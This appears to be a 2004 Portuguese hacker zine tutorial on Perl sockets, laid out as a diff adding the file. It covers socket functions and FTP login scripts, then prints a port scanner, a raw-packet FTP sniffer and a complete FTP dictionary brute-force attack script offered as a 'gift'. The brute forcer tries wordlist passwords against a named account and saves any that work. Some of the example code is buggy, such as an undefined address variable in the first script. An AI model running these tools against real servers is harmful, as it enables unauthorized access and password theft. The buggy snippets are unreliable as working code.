@@ -1,0 +1,724 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[07]=-[Sockets in Perl for dummies]-=|BlackSh33p|-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+                      -------------------------------
+            - - = = <   Sockets in Perl for dummies   > = = - -
+                      -------------------------------
+                        Por: BlackSh33p       06/2004
+
+
+
+
+
+
+___________________
+1. INTRODUCAO       \ __________________
+________________________________________\
+
+
+   É pessoal ... poucos dias de ser lancada o zine eu resolvi escreve
+esse txt porque po, ja tinha ficado devendo na zine passada e prometi
+que faria algo legal para esta zine .Entao ae esta "Sockets  in  perl
+for dummies".Amadores da linguagem C devem estar dizendo A pq perl ao
+inves de C. Bem como disse Larry Wall ,Perl é uma linguagem de  facil
+aprendizado e muito flexivel. Ele esta completamente correto e  tenho
+estudado muito ultimamente .Os requisitos para compreender  esse  txt
+é no minimo que voce sabe o basico de Perl ,just  this  !!  Bem chega
+de falar merda, vou tentar ser o mais pratico possivel e é isso ae...
+
+Enjoy
+
+
+_________________________
+2. Sockets e suas funcoes \ ___________________
+_______________________________________________\
+
+
+   Bem todos dados colocados aqui foram retirados  das  man pages  e
+do livro Perl da editora o'reilly .Eu nao conseguiria  explicar  com
+minhas palavras isso aqui entao me limitarei a mostrar codigos  perl
+fucadores e comenta-los .Teoria deixa pros guru de "PERL" :)
+
+
+1) socket:
+
+sintaxe: socket soquete, dominio, tipo, protocolo
+
+Abre um soquete do tipo especificado e anexa-o ao handle de arquivo
+soquete. O dominio, o tipo e o protocolo sao especificados como para
+socket. Antes de usar esta funcao, seu programa devera conter a linha:
+
+use Socket;
+
+Esta definicao fornecera as devidas constantes. A funcao retornara true
+se tiver sucesso.
+
+Ex: socket(SOQUETE, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or
+die $!;
+
+
+
+
+2) bind:
+
+sintaxe: bind soquete, endereco
+
+Anexa um endereco a um soquete ja aberto especificado pelo handle de
+arquivo soquete. A funcao retornara true se for bem-sucedida e false do
+contrario (e colocara o codigo do erro em $!). O endereco devera ser um
+endereco compactado do devido tipo do soquete.
+
+Ex: bind (SOQUETE, sockaddr_in(80, INADDR_ANY));
+
+
+
+
+3) listen:
+
+sintaxe: listen soquete, tamanho_da_fila
+
+Informa ao sistema operacional que vc esta pronto para aceitar as
+conexoes no soquete e define o numero de conexoes que aguardam para o
+tamanho_da_fila. Se a fila estiver cheia, os clientes que tentam
+conectar o soquete terao a conexao recusada. Usada apenas para os
+soquetes do lado do servidor.
+
+Ex: listen (SOQUETE, 5);
+
+
+
+
+4) accept:
+
+sintaxe: accept novo_soquete, soquete_generico
+
+Prepara um processo do servidor para aceitar as conexoes de soquete dos
+clientes. A execucao e suspensa ate que uma conexao seja feita, neste
+momento o handle de arquivo novo_soquete e aberto e anexado a conexao
+feita recentemente. A funcao retornara o endereco conectado se a
+chamada tiver sucesso, do contrario, retornara false ( colocando o erro
+em $!). O soquete_generico tera que ser um handle de arquivo ja aberto
+atraves da funcao socket e vinculado a um dos enderecos de rede do
+servidor. E usado apenas no lado do servidor.
+
+Ex: accept (NEW_SOCKET, SOQUETE) or die $!;
+
+
+
+
+5) connect;
+
+sintaxe: connect soquete, endereco
+
+Inicia uma conexao com outro processo que esta aguardando em uma accept
+no handle de arquivo soquete. A funcao retornara true para o sucesso,
+do contrario retornara false (colocando o erro em $!). O endereco e um
+endereco da rede compactado do devido tipo de soquete. Para desconectar
+um soquete, use close ou shutdown(8). Usado apenas no lado do cliente.
+
+ex: connect(SOQUETE, sockaddr_in(21, inet_aton('ftp.slackware.com'))
+or die $!;
+
+
+
+
+6) recv:
+
+sintaxe: recv soquete, $var, comprimento, marcas
+
+Recebe uma mensagem em um soquete. Tenta receber os bytes de comprimento
+dos dados na variavel var a partir do handle de arquivo soquete
+especificado. A funcao retornara o endereco do emissor ou um valor
+indefinido se ouver um erro. A var aumentara ou diminuira segundo o
+comprimento atualmente lido. A funcao tem as mesmas marcas da chamada
+do sistema recv.
+
+Ex: recv (SOQUETE, $buffer);
+
+
+
+
+7) send: sintaxe: send soquete, msg, marcas, [dest]
+
+Envia uma mensagem msg em um soquete. Tem as mesmas marcas da chamada do
+sistema com nome igual -- veja send(2). Nos soquetes desconectados, voce
+tera que especificar um destino dest para enviar, neste caso send
+funcionara como a sendto. A funcao retornara o numero de bytes enviados
+ou um valor indefinido se houver um erro. No caso de erro, colocara o
+codigo de erro em $!.
+
+ex: $msg = "fuck";
+    send(SOQUETE, $msg);
+
+
+
+
+8) shutdown (ou close)
+
+sintaxe: shutdown soquete, como
+
+Finaliza uma conexao de soquete da maneira indicada por como. Se como
+for 0, mais recebimentos serao recusados. Se como for 1, mais envios
+serao recusados. Se como for 2, tudo sera recusado.
+
+Ex: shutdown (SOQUETE, 0);
+
+sintaxe: close handle_de_arquivo
+
+Fecha o arquivo, o soquete ou o canal associado ao determinado handle de
+arquivo.
+
+Ex: close(SOQUETE);
+
+
+
+
+############### Funcoes do modulo Socket: ###############
+
+1) inet_aton
+sintaxe: inet_aton(nome_host);
+
+Converte um nome do host como www.algumacoisa.com.br ou 200.217.98.100
+em uma estrutura de dados (uma string com quatro bytes) usada para os
+enderecos de soquete. Se o nome do host nao puder ser resolvido, a
+funcao retornara um valor indefinido.
+
+
+
+2) inet_ntoa
+sintaxe: inet_ntoa(string_ender);
+
+Converte uma string de endereco com quatro bytes (como retornado por
+inet_aton) em uma string com a forma de quatro do endereco IP com pontos.
+
+
+
+3) sockaddr_in
+sintaxe: sockaddr_in(porta, string_ender);
+         pack_sockaddr_in(porta, string_ender);
+
+Obtem um numero da porta e uma string_ender com quatro bytes (como
+retornado por inet_aton) e retorna a estrutura de endereco do soquete
+inclusive os argumentos compactados com o argumento AF_INET. Essa
+estrutura e normalmente o que voce precisara para os argumentos em bind,
+connect e send e e tambem retornada por getpeername, getsockname e recv.
+
+
+
+4) sockaddr_un
+sintaxe: sockaddr_un(nome_caminho);
+         pack_sockaddr_un(nome_caminho);
+
+Obtem um argumento, um nome do caminho e retorna a estrutura do endereco
+de soquete do dominio Unix (o caminho compactado com AF_UNIX preenchido).
+Para os soquetes do dominio Unix, essa estrutura e normalmente o que voce
+precisara para os argumentos em bind, connect e send e e tambem retornada
+oir getpeername, getsockname e recv.
+
+
+
+5) unpack_sockaddr_in
+sintaxe: unpack_sockaddr_in(ender_soquete);
+         sockaddr_in(ender_soquete);
+
+Obtem uma estrutura de endereco do soquete e retorna uma array de dois
+elementos (no contexto da lista): o numero da porta e o endereco de IP
+com quatro bytes.
+
+
+
+6) unpack_sockaddr_un
+sintaxe: unpack_sockaddr_un(ender_soquete_un);
+         sockaddr_un(ender_soquete_un);
+
+Obtem uma estrutura de endereco do soquete do dominio Unix (como
+retornado por sockaddr_un) e retorna o nome do caminho.
+
+
+   Com base nisso podemos fazer alguma coisinha só pra voce ir pegando
+gosto da coisa .Comentarei apenas as funcoes destacadas assima,ou seja
+apenas as utilizadas com a chamada do socket.
+
+-=-=-=-=-=-=--=-=-=-= Cut Here Conecta.pl
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+#!/usr/bin/perl
+
+use Socket;    #Chama do socket
+
+$ARGC =@ARGV;
+if($ARGC < 3){
+   print("Conecta.pl desenvolvido para o tutorial de sockets \n");
+   print("Use : $0 <host> <login> <passwd> \n");
+   print("Motd Guide 3 na veia \n ");
+}
+&struct;
+sub struct{
+
+my($host) =$ARGV[0];
+my($port) =21;
+my($prot) =getprotobyname('tcp'); #Define o protocolo no caso 'tcp'
+my($addr) =inet_aton($host);    #Converte o host em alguma coisa
+my($iaddr) =sockaddr_in($port,$host); #Obtem a porta e host remoto
+
+$sock =socket(SOCK,PF_INET,SOCK_STREAM,$prot)||die "Erro socket \n"; 
+#Declaracao do socket
+connect(SOCK,$iadd)||die "Erro conect \n"; #Connectando no host e
+porta remota
+
+}
+
+$login =$ARGV[1];
+$passwd =$ARGV[2];
+
+send(SOCK,$login)||die"Erro send login \n"; #Enviando login para o server
+send(SOCK,$passwd)||die"Erro send passwd \n"; #Enviando passwd para o
+server
+
+print("Login and passwd it's ok !!\n");
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+   Bem tai um simples exemplo da utilizao de sockets ,um script que
+conecta
+(ftp) e envia seus respectivos login e senha para la. Bem agora que
+voce ja
+sabe alguma coisa sobre Perl sockets. Vamus comecar a avancar.      
+Existe
+alguns modulos capazes de facilitar o uso de sockets em perl .  Todos
+serao
+serao uteis para vc, acredite :)
+
+_____________________
+3. Modulos de Perl   \__________________
+________________________________________\
+
+  Dinovo nesta parte me limitarei apenas cometar o codigo e nao falar
+sobre
+teorias complexas mesmo porque eu nao conseguiria explicar mas deixa
+que  a
+parte do codigo eu mostro direitinho !!
+
+1) PeerAddr
+sintaxe: PeerAddr => nome_host[:porta]
+
+Especifica o host remoto e o numero da porta opcional para uma conexao
+do cliente. O nome_host podera ser um nome, como www.fuck.com ou um
+numero de IP com a forma 200.217.98.100.
+
+
+
+2) PeerPort
+sintaxe: PeerPort => porta
+
+Especifica o numero da porta no host remoto para uma conexao do cliente.
+O nome do servico (como http ou nntp) podera ser usado para o argumento
+se o numero da porta for desconhecido.
+
+
+
+3) LocalAddr
+sintaxe: LocalAddr => nome_host[:porta]
+
+Especifica o endereco local (e o numero da porta opcional) para vincular
+um soquete no lado do servidor.
+
+
+
+4) LocalPort
+sintaxe: LocalPort => porta
+
+Especifica o numero da porta local (ou nome do servico) para vincular um
+soquete no lado do servidor.
+
+
+
+5) Proto
+sintaxe: Proto => nome
+
+Especifica o protocolo a ser executado no soquete, por exemplo, tcp ou
+udp.
+
+
+
+6) Type
+sintaxe: Type => SOCK_STREAM | SOCK_DGRAM
+
+Espefica o tipo de soquete. SOCK_STREAM indica uma conexao de soquete
+baseada em fluxo e SOCK_DGRAM indica uma conexao (datagrama) baseada em
+messagens.
+
+
+
+7) Listen
+sintaxe: Listen => n
+
+Define o tamanho da fila atendente para o numero n de solicitacoes do
+cliente.
+
+
+
+8) Reuse
+sintaxe: Reuse => 1
+
+Dado um numero diferente de zero, esta opcao permitira que o endereco de
+vinculo local seja reutilizado, caso o soquete precise ser reaberto
+depois de um erro.
+
+
+
+9) Timeout
+sintaxe: Timeout => n
+
+Define o intervalo.
+
+
+
+
+############### Metodos do IO:Socket:INET ###############
+
+1) sockaddr
+sintaxe: sockaddr
+
+Retorna a parte do endereco (como string compactada) da estrutura de
+dados de endreco do soquete para o soquete.
+
+
+
+2) sockport
+sintaxe: sockport
+
+Retorna o numero da porta local para o soquete.
+
+
+
+3) sockhost
+sintaxe: sockhost
+
+Retorna a parte do endereco da estrutura de dados de endereco do soquete
+na forma de string com quatro partes e pontos, por exemplo,
+200.217.98.100.
+
+
+
+4) peeraddr
+sintaxe: peeraddr
+
+Retorna a parte do endereco (string compactada) da estrutura de dados de
+endereco do soquete para o host remoto ao qual um soquete se conecta.
+
+
+
+5) peerport
+sintaxe: peerport
+
+Retorna o numero da porta para o host remoto ao qual um soquete se
+conecta.
+
+
+
+6) peerhost
+sintaxe: peerhost
+
+Retorna o endereco do host remoto na forma de string com quatro partes e
+pontos, por exemplo, 200.217.98.100.
+
+
+-=---=-=-=-=-=-=-=-=-=-=-Cut Here conecta2.pl
+=-=--=-=-=-=-=-=-=-=-=-=-=-=-
+
+#!/usr/bin/perl
+
+use IO::Socket::INET;
+
+print("Host : ");
+chomp($host =<stdin>);
+print("\nLogin : ");
+chomp($login =<stdin>);
+print("\nPasswd : ");
+chomp($pass =<stdin>);
+
+$sock =IO::Socket::INET->new(PeerAddr => $host,
+                             PeerPort => 21,
+                             Proto => 'tcp',
+                             Type => SOCK_STREAM)||die "Nao foi
+possivel conectar \n";
+
+print $sock "$login\n";
+print $sock "$pass\n";
+
+$res =<$sock>;
+print"$res\n";
+
+close($sock);
+
+-=-=-=-=-=-=-=-=-=-=-= Cut Here conecta.pl
+-=-=-=-=-========-=-=-=-=-=-=-=-=-=-=
+
+  Bem esta ae mais um simples exemplo, tudo pode ser feito com scripts
+perl isso
+é bem basico mais quero ser o mais detalhado possivel  mas  por  favor
+qualquer
+duvida send me one mail :)
+
+_______________________
+4. Exemplo fucador     \____________________
+____________________________________________\
+
+  Bem chegou a hora tao esperada .Vamus fazer e ver alguns exemplos
+deixei pra
+comentar algumas funcoes nos exemplos .Bem voces devem ter notado que
+to  meio
+apressado pra escreve é ... To finalizando o texto hje /08/08 e
+preciso  manda
+o txt pro IP_FIX ( eae loko :) si nao, nao sai na zine mas prometo q
+logo  vou
+estar disponibilizando uns codez bem legais e outros txt de qualidade
+Ok ?? Ta
+vamus ao primeiro exemplo .
+
+-=-=-=-=-=-=-=-=-=-=-=-= Cut Here scan.pl -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+#!/usr/bin/perl
+
+# MOTD-PScanner v 0.1
+# MOTD Labs  ( http://www.motdlabs.org )
+# coded by inferninh0 (inferninho@motdlabs.org)
+# Description:
+#
+#             Port Scanner using the concept of open scanning
+#             CAN BE LOGGED EASILY, USE ONLY FOR STUDY...;-)
+#
+# Greetz:  hallucination
+####
+
+use Socket;
+$ARGC=@ARGV;
+if($ARGC<1) {
+  print "MOTD-PScanner v 0.1\n";
+  print "Usage: perl $0 host\n\n";
+  exit;   }
+print "\nStarting MOTD-PScanner v 0.1 ( http://www.motdlabs.org/ )";
+print "\nInteresting ports on $ARGV[0]\n\n";
+for($port_in = 0; $port_in <= 6000; $port_in++) {
+$iaddr= inet_aton($ARGV[0]) || die "Nao foi possivel conectar no
+Host.($!)";
+$paddr= sockaddr_in($port_in, $iaddr);
+$proto= getprotobyname('tcp');
+socket(SOCK, AF_INET, SOCK_STREAM, $proto);
+            if(connect(SOCK, $paddr)) {
+            $servico=getservbyport($port_in,'tcp');
+            print "Port $port_in --> $servico  open\n";
+close(SOCK);
+}
+}
+print "\nScanner completed...\n\n";
+exit;
+
+Scan de portas desenvolvido pelo hax0r inferninh0 ( valeu inferninho
+por libera seu code :) Ele scaneia portas de 0 a 6000 a  unica  funcao
+desconhecida é 'getservbyport' q obtem o servico da porta, o resto  se
+ja conhece !!
+
+
+_________________
+5. Presentinho   \_________________
+___________________________________\
+
+  Aproveitem e estudem esses codez :)
+
+-==-=-=-=-=-= Cut Here Brute_force_attack.pl -=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+#!/usr/bin/perl
+
+use Socket;
+
+print "\n\07FTP Brute Force attack 1.0 - Near(Z) - 1998 - SouL Hunter";
+print "\nVersao MONO, nearz\@cyberpace.org\n\n";
+if ($ARGV[0] eq '' || $ARGV[1] eq '' || $ARGV[2] eq '') { print
+"\n\nUsage: hackftp Host Login Dictionary\nEx. hackftp 127.0.0.1 Joao
+Dict\n\n";exit;}
+my($h,$p,$in_addr,$proto,$addr);
+$i=0;$temp='';$temp2='';$temp10='';$temp12='';$h = "$ARGV[0]";
+$p = 21;
+$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
+$proto = getprotobyname('tcp');
+$check=0;
+open (FILE,"$ARGV[2]") || die "cade o dicionario?";
+&resume;
+do{
+      &connection;
+      &getword;
+      &data1;
+      &data2;
+      &result;
+#      &getword;
+#      &data2;
+#      &result;
+      close S;
+}while(1==1);
+
+sub connection
+{
+        socket(S, AF_INET, SOCK_STREAM, $proto) or die $!;
+        connect(S,$addr) or die $!;
+}
+
+sub data1
+{
+        do{
+                read(S, $var1, 1) || die $!;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '220');
+
+}
+sub data2
+{
+      $temp='';
+      $i=0;
+      send (S,"user $ARGV[1]\n",0) || die "Erro enviando";
+        do{
+                read(S, $var1, 1) || die $!;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '331' && substr($temp,$i-3,3)
+ne '530');
+      if(substr($temp,$i-3,3) eq '530'){
+            print "\nLogin nao permitido - $ARGV[1]\n\n";
+            exit;
+      }
+            send (S,"pass $temp2",0) || die "Erro enviando";
+      $temp='';
+      $i=0;
+        do{
+                read(S, $var1, 1) || die $!;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '530' && substr($temp,$i-3,3)
+ne '230');
+}
+sub result
+{
+        if(substr($temp,$i-3,3) eq '230'){
+                  print "\n\07$ARGV[0]/$ARGV[1] - [$z]senha : $temp2\n";
+                  open (FILE3,">>$ARGV[0].$ARGV[1]-result") ;
+                  print FILE3 "\n1 - $ARGV[0]/$ARGV[1] - [$z]    senha :
+$temp2\n";
+                  print FILE2 "\n1 - $ARGV[0]/$ARGV[1] - [$z]    senha :
+$temp2\n";
+                  close FILE3;
+                exit;
+      }
+        if(substr($temp,$i-3,3) eq '530'){
+
+            open (FILE4,">$ARGV[0].$ARGV[1]-resume");
+              print "$ARGV[0]/$ARGV[1] - [$z]    not found - $temp2";
+            print FILE4 "$z                                                    
+                      ";
+            close FILE4;
+      }
+}
+
+sub getword
+{
+        $temp2='';
+        do{
+                read(FILE, $var12, 1);
+                $temp2="$temp2$var12";
+        }while($var12 ne chr(10));
+      $z++;
+}
+sub resume
+{
+            if(open(FILE5,"$ARGV[0].$ARGV[1]-resume")){
+                  read (FILE5, $temp10, 50);
+                  close FILE5;
+                  $z=$temp10;
+                    for($i=0;$i<$z;$i++){
+                        do{
+                                  read(FILE, $var12, 1);
+                                  $temp2="$temp2$var12";
+                          }while($var12 ne chr(10));
+
+                  }
+
+            }
+$i=0;
+}
+
+-=-=-=-=-=-=-=-=-=- Cut Here sniffer.pl -=-=-=-=-=-=-=-=-=-=-=-=
+
+#!/usr/bin/perl
+# Simple script for educational purposes
+# It prints to STDOUT flags tcp packets from ftp server and client
+
+use Net::RawIP; # Net::RawIP rulez :)
+require 'getopts.pl';
+
+Getopts('i:d:n:');
+die "Usage $0 -i  -d  -n "
+unless ($opt_d && $opt_d && $opt_n);
+
+print "Now please login to your ftp server\n";
+
+@flags = qw/URG ACK PSH RST SYN FIN/;
+$filter = "dst host $opt_i and dst port 21";
+$filter1 = "src host $opt_i and src port 21";
+$psize = 1500;
+$device = $opt_d;
+$timeout = 500;
+
+if(fork()){
+$a = new Net::RawIP;
+my $pcap = $a->pcapinit($device,$filter,$psize,$timeout);
+loop $pcap,$opt_n,\&cl,\@a;
+           }
+        else {
+$b = new Net::RawIP;
+my $pcap = $b->pcapinit($device,$filter1,$psize,$timeout);
+loop $pcap,$opt_n,\&sv,\@a;
+                }
+
+sub cl {
+$a->bset(substr( $_[2],14));
+my @fl = $a->get({tcp=>
+                     [qw(psh syn fin rst urg ack)]
+             });
+print "Client -> ";
+map { print "$flags[$_] "  if $fl[$_] } (0..5);
+print "\n"
+}
+
+sub sv {
+$b->bset(substr( $_[2],14));
+my @fl = $b->get({tcp=>
+                     [qw(psh syn fin rst urg ack)]
+             });
+print "Server -> ";
+map { print "$flags[$_] "  if $fl[$_] } (0..5);
+print "\n";
+}
+
+__________________
+5 Finalizando     \_______________
+__________________________________\
+
+  Bem esse foi mais um txt inutil by BlackSh33p, kra pesso desculpa a
+todos vcs fiquei devendo queria te botado muito mais coisa mas nao deu
+mesmo. Tava estudando pra uma prova e acabei esquecendo. Prometo que o
+proximo sera bem melhor. Creditos ao inferninh0 por me permitir usufruir
+de seus codez ( falei bunito agora né :), ao IP_FIX  por  me  ceder  um
+espaco na zine e um alo a _tzlord_ meu parceirao :D
+
+Tank's for all
+
+_________________________
+7.Links                  \_________________
+___________________________________________\
+
+
+http://www.motdlabs.org/
+http://www.perl.com/
+http://www.perl.org/
+http://www.oreilly.com/
+http://Tutorial.VirtualAve.net/
